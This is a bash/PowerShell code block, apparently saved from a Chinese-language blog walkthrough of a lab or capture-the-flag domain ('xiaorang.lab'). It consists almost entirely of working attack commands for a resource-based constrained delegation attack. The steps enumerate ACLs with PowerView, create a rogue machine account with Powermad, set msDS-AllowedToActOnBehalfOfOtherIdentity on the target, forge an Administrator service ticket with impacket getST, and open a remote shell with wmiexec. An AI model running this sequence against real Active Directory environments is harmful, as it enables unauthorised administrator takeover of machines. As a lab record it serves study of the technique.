<!-- https://blog.csdn.net/longlangci/article/details/131686439 -->

```bash
# 1. 枚举一下当前用户（lixiuying）对当前机器的DACL。
Import-Module .\PowerView.ps1
Get-DomainUser -Identity lixiuying -Properties objectsid
Get-DomainObjectAcl -Identity XR-0687 | ?{$_.SecurityIdentifier -match "S-1-5-21-3745972894-1678056601-2622918667-1131"}

# 2. 通过与用户lixiuying在域内添加一个计算机账号Test1$，密码Test1234。

Import-Module .\Powermad.ps1
# 设置机器账户的密码
$Password = ConvertTo-SecureString 'Test1234' -AsPlainText -Force
# 通过Net-MachineAccount函数创建机器账户
New-MachineAccount -MachineAccount "Test1" -Password $($Password) -Domain "xiaorang.lab" -DomainController "XR-DC01.xiaorang.lab" -verbose

# 3.通过PowerView.ps1配置PENTEST01到XR-0687的基于资源的约束性委派。
# 将Test1的SID添加到XR-0687这台计算机对象的msDS-AllowedToActOnBehalfOfOtherIdentity属性中。

Import-Module .\PowerView.ps1
# 获取Test1账户的 SID
Get-NetComputer "Test1" -Properties objectsid
# 尝试配置Test1到XR-0687的基于资源的约束性委派
$A = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3745972894-1678056601-2622918667-1147)"
$SDBytes = New-Object byte[] ($A.BinaryLength)
$A.GetBinaryForm($SDBytes, 0)
Get-DomainComputer XR-0687 | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes} -Verbose
# 查看是否配置成功
Get-DomainComputer XR-0687 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# 4.使用 impacket 的 getST.py执行基于资源的约束性委派工具并获取拥有访问XR-0687机器上的GIFS服务的高权限票据。
sudo vim /etc/hosts # 配置ipo
172.22.15.35 XR-0687.xiaorang.lab
proxychains4 impacket-getST xiaorang.lab/Test1\$:Test1234 -dc-ip 172.22.15.13 -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator

# 使用申请的票据获取XR-0687这台机器的本地管理员权限。
export KRB5CCNAME=Administrator.ccache
proxychains4 impacket-wmiexec -k xiaorang.lab/Administrator@XR-0687.xiaorang.lab -no-pass
```